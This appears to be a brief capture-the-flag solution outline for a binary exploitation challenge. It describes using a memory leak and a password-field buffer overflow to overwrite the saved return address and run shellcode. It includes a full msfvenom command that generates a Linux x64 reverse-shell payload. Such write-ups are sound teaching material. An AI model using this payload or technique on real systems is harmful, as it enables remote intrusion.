How to solve:

1. Connect to the program
2. Identify the memory leak
3. Identify the overflow in the password field
4. Identify that exiting the program causes seg-fault, due to overwriting the RIP.

4. Load up the program in debugger
5. Identify the offset from start of buffer to overwriting the saved RIP
6. Write script that takes the address of buffer (the leak), and uses it as the value to overwrite RIP.
7. Write shellcode that either retrieves the file, or runs a reverse shell

msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=8080 --platform linux -a x64 -b "\x00" -f python

Solution could require port forwarding in home router, but doesn't have to.
